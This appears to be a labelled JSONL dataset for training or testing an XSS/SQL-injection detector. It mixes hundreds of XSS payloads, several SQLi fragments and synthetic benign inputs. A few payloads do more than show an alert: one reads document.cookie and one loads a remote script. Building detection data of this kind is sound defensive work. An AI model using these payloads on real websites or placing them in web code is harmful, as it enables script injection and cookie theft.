+{"input":"<style>:target {transform: rotate(180deg);}<\/style><map id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/map>","label":"XSS"}
+{"input":"<acronym onmousemove=\"alert(1)\">test<\/acronym>","label":"XSS"}
+{"input":"top 10 python blogs","label":"benign"}
+{"input":"<nextid onmouseout=\"alert(1)\">test<\/nextid>","label":"XSS"}
+{"input":"<main onpaste=\"alert(1)\" contenteditable>test<\/main>","label":"XSS"}
+{"input":"<nobr onmouseup=\"alert(1)\">test<\/nobr>","label":"XSS"}
+{"input":"{\"user\": \"rodriguezchristopher\", \"action\": \"download\", \"timestamp\": \"1991-04-19T02:06:33\"}","label":"benign"}
+{"input":"<head oncut=\"alert(1)\" contenteditable>test<\/head>","label":"XSS"}
+{"input":"Nice read!","label":"benign"}
+{"input":"'\/*random*\/ or%0a \"%0d","label":"SQLi"}
+{"input":"<style>@keyframes x{}<\/style><output style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/output>","label":"XSS"}
+{"input":"<xmp ondblclick=\"alert(1)\">test<\/xmp>","label":"XSS"}
+{"input":"<source onmousemove=\"alert(1)\">test<\/source>","label":"XSS"}
+{"input":"how to cooking tutorial","label":"benign"}
+{"input":"<animation xlink:href=\"javascript:alert(88)\"\/>","label":"XSS"}
+{"input":"<table onmousedown=\"alert(1)\">test<\/table>","label":"XSS"}
+{"input":"<element onmouseout=\"alert(1)\">test<\/element>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><tfoot ondragover=alert(1) contenteditable>drop here<\/tfoot>","label":"XSS"}
+{"input":"<link draggable=\"true\" ondragleave=\"alert(1)\">test<\/link>","label":"XSS"}
+{"input":"Hello, my name is Cindy Olson.","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><blink style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/blink>","label":"XSS"}
+{"input":"Contact: cowanariel@example.com","label":"benign"}
+{"input":"{\"user\": \"wandagreene\", \"action\": \"edit\", \"timestamp\": \"2014-07-06T14:10:07\"}","label":"benign"}
+{"input":"Hello, my name is Brandon Salinas.","label":"benign"}
+{"input":"<address id=x tabindex=1 ondeactivate=alert(1)><\/address><input id=y autofocus>","label":"XSS"}
+{"input":"<bdi ondblclick=\"alert(1)\">test<\/bdi>","label":"XSS"}
+{"input":"{\"user\": \"cblevins\", \"action\": \"download\", \"timestamp\": \"1990-08-11T23:13:10\"}","label":"benign"}
+{"input":"<rb draggable=\"true\" ondragstart=\"alert(1)\">test<\/rb>","label":"XSS"}
+{"input":"<audio onmouseup=\"alert(1)\">test<\/audio>","label":"XSS"}
+{"input":"<svg draggable=\"true\" ondragstart=\"alert(1)\">test<\/svg>","label":"XSS"}
+{"input":"Great article!","label":"benign"}
+{"input":"<xmp onmouseout=\"alert(1)\">test<\/xmp>","label":"XSS"}
+{"input":"<svg><script onlypossibleinopera:-)> alert(1)","label":"XSS"}
+{"input":"GET \/app HTTP\/1.1","label":"benign"}
+{"input":"<marquee draggable=\"true\" ondragstart=\"alert(1)\">test<\/marquee>","label":"XSS"}
+{"input":"<audio autoplay controls onpause=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>","label":"XSS"}
+{"input":"{\"user\": \"perryjose\", \"action\": \"view\", \"timestamp\": \"1979-06-02T14:15:08\"}","label":"benign"}
+{"input":"how to travel tutorial","label":"benign"}
+{"input":"search=top 10 cooking blogs","label":"benign"}
+{"input":"<data ondblclick=\"alert(1)\">test<\/data>","label":"XSS"}
+{"input":"Great guide!","label":"benign"}
+{"input":"<object draggable=\"true\" ondragend=\"alert(1)\">test<\/object>","label":"XSS"}
+{"input":"<sub onbeforecut=\"alert(1)\" contenteditable>test<\/sub>","label":"XSS"}
+{"input":"<svg onfocusout=alert(1) tabindex=1 id=x><\/svg><input autofocus>","label":"XSS"}
+{"input":"<nav onmouseenter=\"alert(1)\">test<\/nav>","label":"XSS"}
+{"input":"username=whitestacey&password=_k4T1nkf)J","label":"benign"}
+{"input":"Hello, my name is Christina Jones.","label":"benign"}
+{"input":"<embed src=javascript:alert(1)>","label":"XSS"}
+{"input":"<canvas onbeforecut=\"alert(1)\" contenteditable>test<\/canvas>","label":"XSS"}
+{"input":"%        wildcard attribute indicator","label":"SQLi"}
+{"input":"Hello, my name is Erik Hernandez.","label":"benign"}
+{"input":"<frame onkeypress=\"alert(1)\" contenteditable>test<\/frame>","label":"XSS"}
+{"input":"<iframe draggable=\"true\" ondrag=\"alert(1)\">test<\/iframe>","label":"XSS"}
+{"input":"<dd id=x tabindex=1 onfocus=alert(1)><\/dd>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><summary style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/summary>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><output ondragover=alert(1) contenteditable>drop here<\/output>","label":"XSS"}
+{"input":"<sub id=x tabindex=1 onbeforedeactivate=alert(1)><\/sub><input autofocus>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><audio style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/audio>","label":"XSS"}
+{"input":"<meta id=x tabindex=1 onfocus=alert(1)><\/meta>","label":"XSS"}
+{"input":"search=how to travel tutorial","label":"benign"}
+{"input":"<mark id=x tabindex=1 onbeforedeactivate=alert(1)><\/mark><input autofocus>","label":"XSS"}
+{"input":"Contact: halvarado@example.com","label":"benign"}
+{"input":"Hello, my name is April Johnson.","label":"benign"}
+{"input":"<nobr draggable=\"true\" ondrag=\"alert(1)\">test<\/nobr>","label":"XSS"}
+{"input":"<iframe\/onreadystatechange=alert(1)","label":"XSS"}
+{"input":"<param onmouseout=\"alert(1)\">test<\/param>","label":"XSS"}
+{"input":"<small id=x tabindex=1 onactivate=alert(1)><\/small>","label":"XSS"}
+{"input":"<del onmouseover=\"alert(1)\">test<\/del>","label":"XSS"}
+{"input":"Helpful guide!","label":"benign"}
+{"input":"<footer draggable=\"true\" ondrag=\"alert(1)\">test<\/footer>","label":"XSS"}
+{"input":"<fieldset onmouseenter=\"alert(1)\">test<\/fieldset>","label":"XSS"}
+{"input":"<source id=x tabindex=1 onfocusin=alert(1)><\/source>","label":"XSS"}
+{"input":"best machine learning books","label":"benign"}
+{"input":"<canvas onpaste=\"alert(1)\" contenteditable>test<\/canvas>","label":"XSS"}
+{"input":"*{color:red}<\/style>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"<i ondblclick=\"alert(1)\">test<\/i>","label":"XSS"}
+{"input":"<summary draggable=\"true\" ondrag=\"alert(1)\">test<\/summary>","label":"XSS"}
+{"input":"<bdo id=x tabindex=1 ondeactivate=alert(1)><\/bdo><input id=y autofocus>","label":"XSS"}
+{"input":"<base oncontextmenu=\"alert(1)\">test<\/base>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><progress id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/progress>","label":"XSS"}
+{"input":"<multicol id=x tabindex=1 onbeforedeactivate=alert(1)><\/multicol><input autofocus>","label":"XSS"}
+{"input":"Contact: eyoder@example.com","label":"benign"}
+{"input":"Great tutorial!","label":"benign"}
+{"input":"<\/svg>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"<strike draggable=\"true\" ondragstart=\"alert(1)\">test<\/strike>","label":"XSS"}
+{"input":"<address onmouseup=\"alert(1)\">test<\/address>","label":"XSS"}
+{"input":"Hello, my name is Robert Brown.","label":"benign"}
+{"input":"python examples in 2025","label":"benign"}
+{"input":"Insightful post!","label":"benign"}
+{"input":"Contact: caitlinvasquez@example.com","label":"benign"}
+{"input":"<svg><xmp onload=alert(1)><\/xmp>","label":"XSS"}
+{"input":"Hello, my name is Maurice Morales.","label":"benign"}
+{"input":"GET \/list\/app HTTP\/1.1","label":"benign"}
+{"input":"eval(location.hash.slice(1)>#alert(1)","label":"XSS"}
+{"input":"<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">","label":"XSS"}
+{"input":"<rp onmouseover=\"alert(1)\">test<\/rp>","label":"XSS"}
+{"input":"top 10 machine learning blogs","label":"benign"}
+{"input":"<kbd onkeydown=\"alert(1)\" contenteditable>test<\/kbd>","label":"XSS"}
+{"input":"<table onmouseout=\"alert(1)\">test<\/table>","label":"XSS"}
+{"input":"name=leeangie&email=wendythompson@example.net","label":"benign"}
+{"input":"search=music examples in 2025","label":"benign"}
+{"input":"<article id=x tabindex=1 onactivate=alert(1)><\/article>","label":"XSS"}
+{"input":"Hello, my name is David Howard.","label":"benign"}
+{"input":"<map onfocusout=alert(1) tabindex=1 id=x><\/map><input autofocus>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><colgroup id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/colgroup>","label":"XSS"}
+{"input":"<style>:target {color: red;}<\/style><wbr id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/wbr>","label":"XSS"}
+{"input":"Helpful read!","label":"benign"}
+{"input":"{\"user\": \"harrisonalexander\", \"action\": \"view\", \"timestamp\": \"1979-10-31T20:12:46\"}","label":"benign"}
+{"input":"<caption onkeydown=\"alert(1)\" contenteditable>test<\/caption>","label":"XSS"}
+{"input":"best finance books","label":"benign"}
+{"input":"Contact: justinknox@example.org","label":"benign"}
+{"input":"<div id=\"114\"><x style=\"background:url('x[a];color:red;\/*')\">XXX<\/x>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"GET \/tag\/tag\/main HTTP\/1.1","label":"benign"}
+{"input":"GET \/tag\/categories\/category HTTP\/1.1","label":"benign"}
+{"input":"Hello, my name is George Perez.","label":"benign"}
+{"input":"GET \/posts\/search\/posts HTTP\/1.1","label":"benign"}
+{"input":"*{color:gre\/**\/en !\/**\/important} \/* IE 6-9 Standards mode *\/","label":"XSS"}
+{"input":"<article onmouseout=\"alert(1)\">test<\/article>","label":"XSS"}
+{"input":"<thead oncut=\"alert(1)\" contenteditable>test<\/thead>","label":"XSS"}
+{"input":"<wbr id=x tabindex=1 onbeforedeactivate=alert(1)><\/wbr><input autofocus>","label":"XSS"}
+{"input":"<bdo onkeyup=\"alert(1)\" contenteditable>test<\/bdo>","label":"XSS"}
+{"input":"GET \/explore\/app HTTP\/1.1","label":"benign"}
+{"input":"<caption onmouseleave=\"alert(1)\">test<\/caption>","label":"XSS"}
+{"input":"travel examples in 2025","label":"benign"}
+{"input":"name=howardvaughan&email=ortegadarren@example.net","label":"benign"}
+{"input":"<menu onkeydown=\"alert(1)\" contenteditable>test<\/menu>","label":"XSS"}
+{"input":"<blink id=x tabindex=1 onbeforedeactivate=alert(1)><\/blink><input autofocus>","label":"XSS"}
+{"input":"Insightful post!","label":"benign"}
+{"input":"<del onmouseenter=\"alert(1)\">test<\/del>","label":"XSS"}
+{"input":"<li onclick=\"alert(1)\">test<\/li>","label":"XSS"}
+{"input":"travel examples in 2025","label":"benign"}
+{"input":"music examples in 2025","label":"benign"}
+{"input":"<ruby onbeforepaste=\"alert(1)\" contenteditable>test<\/ruby>","label":"XSS"}
+{"input":"Contact: russellsamuel@example.com","label":"benign"}
+{"input":"<h1 oncut=\"alert(1)\" contenteditable>test<\/h1>","label":"XSS"}
+{"input":"Great guide!","label":"benign"}
+{"input":"<param ondblclick=\"alert(1)\">test<\/param>","label":"XSS"}
+{"input":"<tfoot onmouseenter=\"alert(1)\">test<\/tfoot>","label":"XSS"}
+{"input":"<div id=\"94\"><svg xmlns=\"http:\/\/www.w3.org\/2000\/svg\">","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><meter style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/meter>","label":"XSS"}
+{"input":"<dfn onmouseout=\"alert(1)\">test<\/dfn>","label":"XSS"}
+{"input":"<optgroup id=x tabindex=1 ondeactivate=alert(1)><\/optgroup><input id=y autofocus>","label":"XSS"}
+{"input":"Hello, my name is Tara Johnson.","label":"benign"}
+{"input":"<h1 onmousemove=\"alert(1)\">test<\/h1>","label":"XSS"}
+{"input":"{\"user\": \"bellmeghan\", \"action\": \"download\", \"timestamp\": \"1996-12-11T21:10:48\"}","label":"benign"}
+{"input":"Helpful post!","label":"benign"}
+{"input":"<bgsound id=x tabindex=1 onfocusin=alert(1)><\/bgsound>","label":"XSS"}
+{"input":"how to finance tutorial","label":"benign"}
+{"input":"GET \/tag\/categories HTTP\/1.1","label":"benign"}
+{"input":"Hello, my name is Robert Mitchell.","label":"benign"}
+{"input":"\/*start*\/'='\/*end*\/","label":"SQLi"}
+{"input":"<nextid onbeforecut=\"alert(1)\" contenteditable>test<\/nextid>","label":"XSS"}
+{"input":"<link onpaste=\"alert(1)\" contenteditable>test<\/link>","label":"XSS"}
+{"input":"<div id=\"116\"><div id=\"x\">x<\/div>","label":"XSS"}
+{"input":"Nice post!","label":"benign"}
+{"input":"<track id=x tabindex=1 onactivate=alert(1)><\/track>","label":"XSS"}
+{"input":"<footer onmousemove=\"alert(1)\">test<\/footer>","label":"XSS"}
+{"input":"<template onclick=\"alert(1)\">test<\/template>","label":"XSS"}
+{"input":"<tfoot onbeforecopy=\"alert(1)\" contenteditable>test<\/tfoot>","label":"XSS"}
+{"input":"<svg><code onload=alert(1)><\/code>","label":"XSS"}
+{"input":"<xmp onmouseenter=\"alert(1)\">test<\/xmp>","label":"XSS"}
+{"input":"TiMe-bAsEd:","label":"SQLi"}
+{"input":"<tbody onpaste=\"alert(1)\" contenteditable>test<\/tbody>","label":"XSS"}
+{"input":"{\"user\": \"spenceredward\", \"action\": \"download\", \"timestamp\": \"1996-01-05T23:58:12\"}","label":"benign"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><spacer id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/spacer>","label":"XSS"}
+{"input":"{\"user\": \"smithbradley\", \"action\": \"delete\", \"timestamp\": \"2024-04-19T18:28:48\"}","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><small style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/small>","label":"XSS"}
+{"input":"page=15&sort=desc","label":"benign"}
+{"input":"<embed id=x tabindex=1 ondeactivate=alert(1)><\/embed><input id=y autofocus>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><noembed ondrop=alert(1) contenteditable>drop here<\/noembed>","label":"XSS"}
+{"input":"<multicol onmousemove=\"alert(1)\">test<\/multicol>","label":"XSS"}
+{"input":"<span onblur=alert(1) tabindex=1 id=x><\/span><input autofocus>","label":"XSS"}
+{"input":"Great read!","label":"benign"}
+{"input":"GET \/search\/blog HTTP\/1.1","label":"benign"}
+{"input":"<summary id=x tabindex=1 onactivate=alert(1)><\/summary>","label":"XSS"}
+{"input":"<dt onmouseover=\"alert(1)\">test<\/dt>","label":"XSS"}
+{"input":"\"%09 OR\/**\/ \"\"\/**\/ =%0a \"%0a","label":"SQLi"}
+{"input":"<ol onmouseleave=\"alert(1)\">test<\/ol>","label":"XSS"}
+{"input":"Hello, my name is Tiffany Adams.","label":"benign"}
+{"input":"<table onbeforecopy=\"alert(1)\" contenteditable>test<\/table>","label":"XSS"}
+{"input":"<object id=x tabindex=1 onbeforeactivate=alert(1)><\/object>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><time style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/time>","label":"XSS"}
+{"input":"{\"user\": \"isutton\", \"action\": \"delete\", \"timestamp\": \"2003-10-18T23:13:05\"}","label":"benign"}
+{"input":"Hello, my name is Molly Dodson.","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><map style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/map>","label":"XSS"}
+{"input":"<blockquote onmouseout=\"alert(1)\">test<\/blockquote>","label":"XSS"}
+{"input":"<noembed onmousedown=\"alert(1)\">test<\/noembed>","label":"XSS"}
+{"input":"<D3\/OnMouSEenTer=[2].find(confirm)>z","label":"XSS"}
+{"input":"<div id=\"84\"><x xmlns:ev=\"http:\/\/www.w3.org\/2001\/xml-events\" ev:event=\"load\" ev:handler=\"javascript:alert(84)\/\/#x\"\/>\/\/[\"'`-->]]>]<\/div><div id=\"85\"><x xmlns:ev=\"http:\/\/www.w3.org\/2001\/xml-events\" ev:event=\"load\" ev:handler=\"test.evt#x\"\/>\/\/[\"'`-->]]>]<\/div><div id=\"86\"><body oninput=alert(86)><input autofocus>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"search=top 10 music blogs","label":"benign"}
+{"input":"<input type=radio id=x onfocus=alert(1)>","label":"XSS"}
+{"input":"<frameset oncopy=\"alert(1)\" contenteditable>test<\/frameset>","label":"XSS"}
+{"input":"<basefont oncopy=\"alert(1)\" contenteditable>test<\/basefont>","label":"XSS"}
+{"input":"Hello, my name is Tracy Moore.","label":"benign"}
+{"input":"GET \/tag HTTP\/1.1","label":"benign"}
+{"input":"<link onmousemove=\"alert(1)\">test<\/link>","label":"XSS"}
+{"input":"<track onblur=alert(1) tabindex=1 id=x><\/track><input autofocus>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><samp ondragover=alert(1) contenteditable>drop here<\/samp>","label":"XSS"}
+{"input":"<fieldset draggable=\"true\" ondragleave=\"alert(1)\">test<\/fieldset>","label":"XSS"}
+{"input":"<style>:target {color: red;}<\/style><head id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/head>","label":"XSS"}
+{"input":"<code onkeypress=\"alert(1)\" contenteditable>test<\/code>","label":"XSS"}
+{"input":"best machine learning books","label":"benign"}
+{"input":"%27%20or%20%22","label":"SQLi"}
+{"input":"Contact: frankryan@example.org","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><hgroup style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/hgroup>","label":"XSS"}
+{"input":"<param onbeforecopy=\"alert(1)\" contenteditable>test<\/param>","label":"XSS"}
+{"input":"<style>:target {color: red;}<\/style><main id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/main>","label":"XSS"}
+{"input":"<marquee onclick=\"alert(1)\">test<\/marquee>","label":"XSS"}
+{"input":"<sCrIpt\/\"<a\"\/srC=data:=\".<a,[8].some(confirm)>","label":"XSS"}
+{"input":"<hgroup onbeforepaste=\"alert(1)\" contenteditable>test<\/hgroup>","label":"XSS"}
+{"input":"GET \/tags HTTP\/1.1","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><address style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/address>","label":"XSS"}
+{"input":"<sup onmouseover=\"alert(1)\">test<\/sup>","label":"XSS"}
+{"input":"<details onmouseout=\"alert(1)\">test<\/details>","label":"XSS"}
+{"input":"<tfoot onbeforecut=\"alert(1)\" contenteditable>test<\/tfoot>","label":"XSS"}
+{"input":"Nice tutorial!","label":"benign"}
+{"input":"feedback=Who commercial that brother compare kind share.","label":"benign"}
+{"input":"<pre ondblclick=\"alert(1)\">test<\/pre>","label":"XSS"}
+{"input":"<dt oncut=\"alert(1)\" contenteditable>test<\/dt>","label":"XSS"}
+{"input":"\/*start*\/\\\/*end*\/","label":"SQLi"}
+{"input":"GET \/blog HTTP\/1.1","label":"benign"}
+{"input":"name=teresagutierrez&email=gwhite@example.com","label":"benign"}
+{"input":"<audio id=x tabindex=1 onbeforeactivate=alert(1)><\/audio>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><script style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/script>","label":"XSS"}
+{"input":"GET \/list\/search HTTP\/1.1","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><hgroup id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/hgroup>","label":"XSS"}
+{"input":"<noembed draggable=\"true\" ondragleave=\"alert(1)\">test<\/noembed>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><td ondrop=alert(1) contenteditable>drop here<\/td>","label":"XSS"}
+{"input":"<datalist id=x tabindex=1 ondeactivate=alert(1)><\/datalist><input id=y autofocus>","label":"XSS"}
+{"input":"Hello, my name is Heather Smith.","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><title style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/title>","label":"XSS"}
+{"input":"<s onblur=alert(1) tabindex=1 id=x><\/s><input autofocus>","label":"XSS"}
+{"input":"top 10 python blogs","label":"benign"}
+{"input":"<details onkeypress=\"alert(1)\" contenteditable>test<\/details>","label":"XSS"}
+{"input":"<dir onbeforecopy=\"alert(1)\" contenteditable>test<\/dir>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><label ondrop=alert(1) contenteditable>drop here<\/label>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><noscript style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/noscript>","label":"XSS"}
+{"input":"best cooking books","label":"benign"}
+{"input":"<meter draggable=\"true\" ondrag=\"alert(1)\">test<\/meter>","label":"XSS"}
+{"input":"<datalist onkeydown=\"alert(1)\" contenteditable>test<\/datalist>","label":"XSS"}
+{"input":"<deTAiLs\/open\/oNtoGGle=confirm()>","label":"XSS"}
+{"input":"<select onpaste=\"alert(1)\" contenteditable>test<\/select>","label":"XSS"}
+{"input":"<h1 onpaste=\"alert(1)\" contenteditable>test<\/h1>","label":"XSS"}
+{"input":"search=cooking examples in 2025","label":"benign"}
+{"input":"<keygen onclick=\"alert(1)\">test<\/keygen>","label":"XSS"}
+{"input":"{\"user\": \"allenjonathan\", \"action\": \"delete\", \"timestamp\": \"2003-01-28T15:05:20\"}","label":"benign"}
+{"input":"GET \/search\/wp-content\/posts HTTP\/1.1","label":"benign"}
+{"input":"what is music?","label":"benign"}
+{"input":"<svg onblur=alert(1) tabindex=1 id=x><\/svg><input autofocus>","label":"XSS"}
+{"input":"<b id=x tabindex=1 onfocusin=alert(1)><\/b>","label":"XSS"}
+{"input":"<audio autoplay onloadedmetadata=alert(1)> <source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>","label":"XSS"}
+{"input":"<title id=x tabindex=1 onfocusin=alert(1)><\/title>","label":"XSS"}
+{"input":"<bgsound onmousedown=\"alert(1)\">test<\/bgsound>","label":"XSS"}
+{"input":"<source onmouseleave=\"alert(1)\">test<\/source>","label":"XSS"}
+{"input":"GET \/wp-content\/wp-content\/main HTTP\/1.1","label":"benign"}
+{"input":"GET \/categories\/app HTTP\/1.1","label":"benign"}
+{"input":"Hello, my name is Natasha Mcgee.","label":"benign"}
+{"input":"<pre onkeydown=\"alert(1)\" contenteditable>test<\/pre>","label":"XSS"}
+{"input":"<area onbeforepaste=\"alert(1)\" contenteditable>test<\/area>","label":"XSS"}
+{"input":"<object onblur=alert(1) tabindex=1 id=x><\/object><input autofocus>","label":"XSS"}
+{"input":"<tfoot onmouseup=\"alert(1)\">test<\/tfoot>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><head id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/head>","label":"XSS"}
+{"input":"<xmp onfocusout=alert(1) tabindex=1 id=x><\/xmp><input autofocus>","label":"XSS"}
+{"input":"<video id=x tabindex=1 onbeforeactivate=alert(1)><\/video>","label":"XSS"}
+{"input":"<slot draggable=\"true\" ondrag=\"alert(1)\">test<\/slot>","label":"XSS"}
+{"input":"<listing oncopy=\"alert(1)\" contenteditable>test<\/listing>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><sup id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/sup>","label":"XSS"}
+{"input":"<li onkeypress=\"alert(1)\" contenteditable>test<\/li>","label":"XSS"}
+{"input":"<div id=\"92\"><div style=\"background:url(http:\/\/foo.f\/f oo\/;color:red\/*\/foo.jpg);\">X<\/div>\/\/[\"'`-->]]>]<\/div><div id=\"93\"><div style=\"list-style:url(http:\/\/foo.f)\\20url(javascript:alert(93));\">X<\/div>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"<noscript onblur=alert(1) tabindex=1 id=x><\/noscript><input autofocus>","label":"XSS"}
+{"input":"<thead id=x tabindex=1 onfocusin=alert(1)><\/thead>","label":"XSS"}
+{"input":"Contact: amandamoody@example.org","label":"benign"}
+{"input":"<caption ondblclick=\"alert(1)\">test<\/caption>","label":"XSS"}
+{"input":"<i id=x tabindex=1 onbeforedeactivate=alert(1)><\/i><input autofocus>","label":"XSS"}
+{"input":"'='","label":"SQLi"}
+{"input":"Nice post!","label":"benign"}
+{"input":"<form draggable=\"true\" ondragstart=\"alert(1)\">test<\/form>","label":"XSS"}
+{"input":"GET \/list\/posts\/tag HTTP\/1.1","label":"benign"}
+{"input":"<sub onmouseenter=\"alert(1)\">test<\/sub>","label":"XSS"}
+{"input":"<button oncopy=\"alert(1)\" contenteditable>test<\/button>","label":"XSS"}
+{"input":"GET \/tags\/blog HTTP\/1.1","label":"benign"}
+{"input":"<tr onmouseleave=\"alert(1)\">test<\/tr>","label":"XSS"}
+{"input":"Contact: amandaaustin@example.net","label":"benign"}
+{"input":"<em onmousemove=\"alert(1)\">test<\/em>","label":"XSS"}
+{"input":"<multicol onbeforecut=\"alert(1)\" contenteditable>test<\/multicol>","label":"XSS"}
+{"input":"music examples in 2025","label":"benign"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><sub id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/sub>","label":"XSS"}
+{"input":"feed:data:text\/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;\/script>&#x3c;b>","label":"XSS"}
+{"input":"<article id=x tabindex=1 onfocus=alert(1)><\/article>","label":"XSS"}
+{"input":"page=8&sort=desc","label":"benign"}
+{"input":"Contact: paulmcdaniel@example.org","label":"benign"}
+{"input":"{\"user\": \"wmcclure\", \"action\": \"delete\", \"timestamp\": \"1979-01-21T07:22:05\"}","label":"benign"}
+{"input":"<pre oncontextmenu=\"alert(1)\">test<\/pre>","label":"XSS"}
+{"input":"<element onkeydown=\"alert(1)\" contenteditable>test<\/element>","label":"XSS"}
+{"input":"<blockquote onkeyup=\"alert(1)\" contenteditable>test<\/blockquote>","label":"XSS"}
+{"input":"<ol id=x tabindex=1 onactivate=alert(1)><\/ol>","label":"XSS"}
+{"input":"<form onsubmit=alert(1)><input type=submit>","label":"XSS"}
+{"input":"Hello, my name is Cody Carter.","label":"benign"}
+{"input":"<map id=x tabindex=1 onbeforeactivate=alert(1)><\/map>","label":"XSS"}
+{"input":"<sub onmouseout=\"alert(1)\">test<\/sub>","label":"XSS"}
+{"input":"<legend draggable=\"true\" ondragstart=\"alert(1)\">test<\/legend>","label":"XSS"}
+{"input":"<title onfocusout=alert(1) tabindex=1 id=x><\/title><input autofocus>","label":"XSS"}
+{"input":"<input onmouseleave=\"alert(1)\">test<\/input>","label":"XSS"}
+{"input":"<cite onbeforepaste=\"alert(1)\" contenteditable>test<\/cite>","label":"XSS"}
+{"input":"<dd onbeforecut=\"alert(1)\" contenteditable>test<\/dd>","label":"XSS"}
+{"input":"feedback=All ok stand save baby.","label":"benign"}
+{"input":"<data onpaste=\"alert(1)\" contenteditable>test<\/data>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><legend id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/legend>","label":"XSS"}
+{"input":"what is music?","label":"benign"}
+{"input":"<hr onbeforecut=\"alert(1)\" contenteditable>test<\/hr>","label":"XSS"}
+{"input":"<head draggable=\"true\" ondragend=\"alert(1)\">test<\/head>","label":"XSS"}
+{"input":"Hello, my name is Mary Nelson.","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><cite ondrop=alert(1) contenteditable>drop here<\/cite>","label":"XSS"}
+{"input":"<SCRIPT SRC=http:\/\/ha.ckers.org\/xss.js?<B>","label":"XSS"}
+{"input":"<header onclick=\"alert(1)\">test<\/header>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><link style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/link>","label":"XSS"}
+{"input":"GET \/app\/category HTTP\/1.1","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><tt id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/tt>","label":"XSS"}
+{"input":"GET \/explore\/explore HTTP\/1.1","label":"benign"}
+{"input":"page=12&sort=asc","label":"benign"}
+{"input":"Contact: sarah38@example.net","label":"benign"}
+{"input":"GET \/tags HTTP\/1.1","label":"benign"}
+{"input":"<strike draggable=\"true\" ondrag=\"alert(1)\">test<\/strike>","label":"XSS"}
+{"input":"Hello, my name is Samantha Garrett.","label":"benign"}
+{"input":"<time ondblclick=\"alert(1)\">test<\/time>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><ins style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/ins>","label":"XSS"}
+{"input":"<strong oncopy=\"alert(1)\" contenteditable>test<\/strong>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><img style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/img>","label":"XSS"}
+{"input":"Insightful article!","label":"benign"}
+{"input":"<button onbeforepaste=\"alert(1)\" contenteditable>test<\/button>","label":"XSS"}
